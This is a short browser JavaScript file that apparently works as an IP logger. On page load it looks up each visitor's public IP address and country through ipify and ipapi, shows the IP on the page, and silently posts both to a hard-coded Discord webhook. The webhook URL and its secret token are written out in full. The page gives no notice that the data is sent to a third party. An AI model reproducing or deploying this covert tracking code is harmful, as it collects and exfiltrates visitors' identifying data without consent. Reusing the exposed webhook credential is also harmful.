// Discord webhook URL
const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd";

// Function to fetch the user's IP address
async function fetchIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

// Function to fetch the country based on the IP address
async function fetchCountry(ip) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/country_name/`);
    const country = await response.text();
    return country;
  } catch (error) {
    console.error("Error fetching country:", error);
    return "Unknown";
  }
}

// Function to send data to Discord webhook
async function sendToDiscord(ip, country) {
  const data = {
    content: `**IP Address:** ${ip}\n**Country:** ${country}`,
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    console.log("Data sent to Discord successfully!");
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

// Main function to fetch IP, country, and send to Discord
async function main() {
  const ip = await fetchIP();
  if (ip) {
    const country = await fetchCountry(ip);
    document.getElementById("ip-address").textContent = ip;

    // Send IP and country to Discord
    await sendToDiscord(ip, country);
  } else {
    document.getElementById("ip-address").textContent = "Failed to fetch IP.";
  }
}

// Run the main function when the page loads
document.addEventListener("DOMContentLoaded", main);
